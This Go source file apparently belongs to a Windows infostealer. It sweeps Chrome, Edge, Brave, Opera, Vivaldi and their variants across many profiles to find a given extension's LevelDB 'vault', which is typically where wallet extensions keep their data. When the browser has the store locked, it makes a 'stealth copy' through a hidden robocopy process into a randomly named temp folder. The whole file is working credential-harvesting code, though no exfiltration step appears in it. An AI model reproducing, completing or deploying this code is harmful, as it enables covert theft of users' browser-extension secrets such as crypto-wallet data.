//go:build windows

package browser

import (
	"fmt"
	"io"
	"math/rand"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"syscall"
	"time"

	"github.com/syndtr/goleveldb/leveldb"
	"github.com/syndtr/goleveldb/leveldb/opt"
)

// LogFunc is an optional log callback. Set it before calling any functions.
var LogFunc func(tag, format string, args ...interface{})

func log(tag, format string, args ...interface{}) {
	if LogFunc != nil {
		LogFunc(tag, format, args...)
	}
}

// ---------------------------------------------------------------------------
// Browser definitions
// ---------------------------------------------------------------------------

// BrowserDef defines a Chromium-based browser's name and User Data path
// relative to %LOCALAPPDATA%.
type BrowserDef struct {
	Name    string
	RelPath string
}

// AllBrowsers is the list of all supported Chromium-based browsers.
// Ordered by likelihood — common browsers first for faster vault discovery.
var AllBrowsers = []BrowserDef{
	// Mainline
	{Name: "Chrome", RelPath: filepath.Join("Google", "Chrome", "User Data")},
	{Name: "Edge", RelPath: filepath.Join("Microsoft", "Edge", "User Data")},

	// Chromium forks
	{Name: "Brave", RelPath: filepath.Join("BraveSoftware", "Brave-Browser", "User Data")},
	{Name: "Opera", RelPath: filepath.Join("Opera Software", "Opera Stable")},
	{Name: "Vivaldi", RelPath: filepath.Join("Vivaldi", "User Data")},
	{Name: "Chromium", RelPath: filepath.Join("Chromium", "User Data")},

	// Edge variants — same engine, different install paths
	{Name: "Edge Beta", RelPath: filepath.Join("Microsoft", "Edge Beta", "User Data")},
	{Name: "Edge Dev", RelPath: filepath.Join("Microsoft", "Edge Dev", "User Data")},
	{Name: "Edge Canary", RelPath: filepath.Join("Microsoft", "Edge SxS", "User Data")},

	// Opera variants
	{Name: "Opera GX", RelPath: filepath.Join("Opera Software", "Opera GX Stable")},
}

// AllProfiles returns the list of profile directory names to check.
func AllProfiles() []string {
	profiles := []string{"Default"}
	for i := 1; i <= 20; i++ {
		profiles = append(profiles, fmt.Sprintf("Profile %d", i))
	}
	profiles = append(profiles, "Guest Profile")
	return profiles
}

// ---------------------------------------------------------------------------
// Vault discovery
// ---------------------------------------------------------------------------

// VaultInfo describes a discovered extension vault.
type VaultInfo struct {
	Browser string // e.g. "Chrome"
	Profile string // e.g. "Default"
	Path    string // full path to the LevelDB directory
}

// FindExtensionVaults scans all browsers and profiles for a given extension ID.
// Returns all valid vault paths found.
func FindExtensionVaults(extensionID string) []VaultInfo {
	localAppData := os.Getenv("LOCALAPPDATA")
	if localAppData == "" {
		return nil
	}

	profiles := AllProfiles()
	var vaults []VaultInfo

	for _, browser := range AllBrowsers {
		basePath := filepath.Join(localAppData, browser.RelPath)
		if _, err := os.Stat(basePath); err != nil {
			continue
		}

		for _, profile := range profiles {
			profilePath := filepath.Join(basePath, profile)
			if _, err := os.Stat(profilePath); err != nil {
				continue
			}

			vaultPath := filepath.Join(profilePath, "Local Extension Settings", extensionID)
			if IsValidVault(vaultPath) {
				vaults = append(vaults, VaultInfo{
					Browser: browser.Name,
					Profile: profile,
					Path:    vaultPath,
				})
			}
		}
	}

	return vaults
}

// IsValidVault checks if a directory looks like a LevelDB vault by checking
// for at least one of the standard marker files.
func IsValidVault(vaultPath string) bool {
	if _, err := os.Stat(filepath.Join(vaultPath, "CURRENT")); err == nil {
		return true
	}
	for _, m := range []string{"MANIFEST-000001", "LOG"} {
		if _, err := os.Stat(filepath.Join(vaultPath, m)); err == nil {
			return true
		}
	}
	return false
}

// ---------------------------------------------------------------------------
// Stealth LevelDB open (copy if locked)
// ---------------------------------------------------------------------------

// OpenVaultStealth opens a LevelDB vault. If the vault is locked by a browser,
// it creates a stealth copy and opens that instead. Returns the db, a temp path
// (empty if no copy was needed), and any error.
func OpenVaultStealth(vaultPath string) (*leveldb.DB, string, error) {
	// Try direct open first — works if browser is closed
	db, err := leveldb.OpenFile(vaultPath, &opt.Options{ReadOnly: true})
	if err == nil {
		return db, "", nil
	}

	log("BROWSER", "Vault locked, stealth copying: %s", vaultPath)

	// Vault is locked — stealth copy with progressive backoff
	const maxRetries = 5
	for attempt := 1; attempt <= maxRetries; attempt++ {
		if attempt > 1 {
			delay := time.Duration(150*attempt) * time.Millisecond
			if attempt >= 4 {
				delay = time.Duration(500) * time.Millisecond
			}
			time.Sleep(delay)
		}

		tempPath, err := stealthCopyVault(vaultPath)
		if err != nil {
			log("BROWSER", "Stealth copy attempt %d/%d failed: %v", attempt, maxRetries, err)
			if attempt == maxRetries {
				return nil, "", fmt.Errorf("stealth copy failed after %d attempts: %w", maxRetries, err)
			}
			continue
		}

		// Try RecoverFile first (handles mid-write copies), then normal open
		db, err = leveldb.RecoverFile(tempPath, nil)
		if err != nil {
			db, err = leveldb.OpenFile(tempPath, nil)
			if err != nil {
				CleanupVault(tempPath)
				log("BROWSER", "Open vault copy attempt %d/%d failed: %v", attempt, maxRetries, err)
				if attempt == maxRetries {
					return nil, "", fmt.Errorf("failed to open vault copy after %d attempts: %w", maxRetries, err)
				}
				continue
			}
		}

		return db, tempPath, nil
	}

	return nil, "", fmt.Errorf("vault open failed after %d attempts", maxRetries)
}

// ---------------------------------------------------------------------------
// Stealth copy implementation
// ---------------------------------------------------------------------------

func stealthCopyVault(vaultPath string) (string, error) {
	rng := rand.New(rand.NewSource(time.Now().UnixNano()))
	tag := make([]byte, 6)
	for i := range tag {
		tag[i] = "abcdefghijklmnopqrstuvwxyz0123456789"[rng.Intn(36)]
	}
	tempDir := filepath.Join(os.TempDir(), fmt.Sprintf("v_%d_%s", time.Now().UnixMilli(), string(tag)))

	// Prefer robocopy — handles locked files gracefully
	if err := os.MkdirAll(tempDir, 0o755); err == nil {
		if ok, _ := robocopyVault(vaultPath, tempDir); ok {
			return tempDir, nil
		}
		os.RemoveAll(tempDir)
	}

	// Fallback: manual file-by-file copy with retry per-file
	if err := os.MkdirAll(tempDir, 0o755); err != nil {
		return "", fmt.Errorf("mkdir: %w", err)
	}

	entries, err := os.ReadDir(vaultPath)
	if err != nil {
		os.RemoveAll(tempDir)
		return "", fmt.Errorf("readdir: %w", err)
	}

	var copied, retried int
	for _, entry := range entries {
		name := entry.Name()
		if name == "LOCK" {
			continue
		}

		src := filepath.Join(vaultPath, name)
		dst := filepath.Join(tempDir, name)

		var copyErr error
		if entry.IsDir() {
			copyErr = copyDirRecursive(src, dst)
		} else {
			copyErr = copyFileSafe(src, dst)
		}
		if copyErr != nil {
			// Retry once after a small delay
			time.Sleep(50 * time.Millisecond)
			if entry.IsDir() {
				copyErr = copyDirRecursive(src, dst)
			} else {
				copyErr = copyFileSafe(src, dst)
			}
			if copyErr != nil {
				retried++
				continue
			}
		}
		copied++
	}

	if copied > 0 && IsValidVault(tempDir) {
		return tempDir, nil
	}

	os.RemoveAll(tempDir)
	return "", fmt.Errorf("stealth copy: %d files copied (%d retried after conflict)", copied, retried)
}

func robocopyVault(src, dst string) (bool, error) {
	cmd := exec.Command("robocopy",
		src, dst,
		"/MIR", "/R:1", "/W:1",
		"/XF", "LOCK",
		"/NFL", "/NDL", "/NJH", "/NJS",
	)
	cmd.SysProcAttr = &syscall.SysProcAttr{
		HideWindow:    true,
		CreationFlags: 0x08000000, // CREATE_NO_WINDOW
	}

	err := cmd.Run()
	exitCode := 0
	if exitErr, ok := err.(*exec.ExitError); ok {
		exitCode = exitErr.ExitCode()
	} else if err != nil {
		return false, err
	}

	// robocopy exit codes: 0-7 = success respectively
	if exitCode >= 8 {
		return false, fmt.Errorf("robocopy exit %d", exitCode)
	}

	return IsValidVault(dst), nil
}

func copyFileSafe(src, dst string) error {
	sf, err := os.Open(src)
	if err != nil {
		return err
	}
	defer sf.Close()

	info, err := sf.Stat()
	if err != nil {
		return err
	}

	df, err := os.OpenFile(dst, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, info.Mode())
	if err != nil {
		return err
	}
	defer df.Close()

	_, err = io.Copy(df, sf)
	return err
}

func copyDirRecursive(src, dst string) error {
	srcInfo, err := os.Stat(src)
	if err != nil {
		return err
	}
	if err := os.MkdirAll(dst, srcInfo.Mode()); err != nil {
		return err
	}

	entries, err := os.ReadDir(src)
	if err != nil {
		return err
	}

	for _, entry := range entries {
		sp := filepath.Join(src, entry.Name())
		dp := filepath.Join(dst, entry.Name())
		if entry.IsDir() {
			if err := copyDirRecursive(sp, dp); err != nil {
				return err
			}
		} else {
			if err := copyFileSafe(sp, dp); err != nil {
				return err
			}
		}
	}
	return nil
}

// CleanupVault safely removes a temp vault copy.
func CleanupVault(tempDir string) {
	if tempDir == "" {
		return
	}
	if !strings.Contains(tempDir, "v_") {
		return
	}
	os.RemoveAll(tempDir)
}
